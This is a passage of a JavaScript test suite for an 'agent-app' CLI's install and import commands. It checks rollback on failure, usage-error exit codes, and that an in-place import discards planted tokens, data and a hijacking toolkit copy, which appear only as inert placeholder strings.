  const pkg = join(base, "kit-open-src");
  kitPackage(pkg, "test-kit", "Kit Open", "multi-user");
  const result = JSON.parse((await run(["install", "--from", pkg], 1)).stdout);
  served.push(result.dir);
  assert.equal(result.ok, false);
  assert.equal(result.served, false);
  assert.ok(result.gate.failures.some((f) => /multi-user access/.test(f.step)), "the access check failed");
  await assert.rejects(fetch(`http://127.0.0.1:${result.port}/api/_a2app`), "the app was stopped");
  assert.ok(existsSync(join(result.dir, "manifest.json")), "it stays installed, to be fixed");
  served.pop();
});

test("a failure after the app is placed and registered rolls everything back", async () => {
  const before = snapshot();
  const pkg = join(base, "kit-broken-src");
  kitPackage(pkg, "test-kit-broken", "Kit Broken");
  const result = JSON.parse((await run(["install", "--from", pkg], 1)).stdout);
  assert.equal(result.step, "dependencies");
  assertNothingLeft(before, "dependencies failure");
});

test("in-place import: sanitized, re-vendored from the local toolkit — never one planted beside it", async () => {
  const dir = join(base, "inplace");
  cpSync(pkgTree, dir, { recursive: true });
  put(dir, ".agent-token", "attacker-known-key");
  put(dir, "data/db.sqlite", "someone else's records");
  put(dir, ".git/config", "[core]");
  put(dir, ".a2app/serve.json", "{}");
  // A toolkit of the same id planted inside the folder, which is also the
  // working directory — the first place a bare id is looked up.
  put(dir, "blueprint-react-node/a2app.toolkit.json", JSON.stringify({ id: "blueprint-react-node", template: "template", systemPaths: ["manifest.json", "server.mjs"] }));
  put(dir, "blueprint-react-node/template/server.mjs", "// planted\n");
  put(dir, "server.mjs", "// tampered\n");
  const result = json(await run([".", "import", "--no-start"], 0, { cwd: dir }));
  assert.equal(result.ok, true);
  assert.equal(result.dir, dir);
  assert.equal(result.trust, "untrusted");
  assert.deepEqual({ kind: result.source.kind, location: result.source.location }, { kind: "folder", location: dir });
  assert.notEqual(read(dir, ".agent-token").trim(), "attacker-known-key");
  for (const gone of ["data", ".git", ".a2app/serve.json"]) assert.equal(existsSync(join(dir, ...gone.split("/"))), false, gone);
  assert.equal(read(dir, "server.mjs"), read(reactNode, "template", "server.mjs"));
  assert.equal(JSON.parse(read(dir, ".a2app", "toolkit.json")).source, reactNode);
  assert.ok(registered().includes(dir));
  assert.deepEqual(readdirSync(base).filter((n) => /\.(previous|incoming)-/.test(n)), [], "nothing set aside is left");
});

test("in-place import that fails leaves the folder exactly as it was", async () => {
  // Refused before the swap.
  const early = join(base, "inplace-unknown");
  cpSync(pkgTree, early, { recursive: true });
  put(early, ".a2app/toolkit.json", JSON.stringify({ id: "blueprint-nope" }));
  put(early, ".agent-token", "keep me");
  const earlyBefore = listTree(early);
  assert.equal(JSON.parse((await run([early, "import", "--no-start"], 1)).stdout).step, "revendor");
  assert.deepEqual(listTree(early), earlyBefore);
  assert.equal(read(early, ".agent-token"), "keep me");

  // Failing after the swap and the registration.
  const late = join(base, "inplace-broken");
  kitPackage(late, "test-kit-broken", "Late Failure");
  put(late, "data/db.sqlite", "records");
  const lateBefore = listTree(late);
  const manifestBefore = read(late, "manifest.json");
  const registryBefore = registered();
  assert.equal(JSON.parse((await run([late, "import"], 1)).stdout).step, "dependencies");
  assert.deepEqual(listTree(late), lateBefore);
  assert.equal(read(late, "manifest.json"), manifestBefore);
  assert.equal(read(late, "data", "db.sqlite"), "records");
  assert.deepEqual(registered(), registryBefore);
  assert.deepEqual(readdirSync(base).filter((n) => /\.(previous|incoming)-/.test(n)), []);
});

test("usage errors exit 2", async () => {
  await run(["install"], 2);
  await run(["install", "round-trip", "--from", exported], 2);
  await run(["install", "round-trip", "--no-strat"], 2);
  await run(["install", "round-trip", "--port", "99999"], 2);
  await run(["install", "--from", exported, "--source", market], 2);
  await run(["install", "--from", exported, "--into", pkgSrc], 2);
  await run(["install", "--from", join(base, "missing.zip")], 2);
  await run(["inspect"], 2);
  await run(["catalogue", "extra"], 2);
  const help = await run(["install", "--help"], 0);
  assert.match(help.stdout, /agent-app install <catalogue id>/);
});

/* ------------------------------------------------------------------ run */

let failed = 0;
try {
  for (const { name, fn } of tests) {
    try {
      await fn();
      console.log(`  ✓ ${name}`);
    } catch (err) {
      failed += 1;
      console.error(`  ✗ ${name}\n    ${String(err?.stack ?? err).split("\n").join("\n    ")}`);
    }
  }
} finally {
  for (const dir of served) await cli([dir, "stop"]).catch(() => {});
  github.closeAllConnections();
  await new Promise((r) => github.close(r));
  rmSync(base, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
}
if (failed > 0) {
  console.error(`✗ install: ${failed} of ${tests.length} failed`);
  process.exit(1);
}
console.log(`✓ install: ${tests.length} passed`);
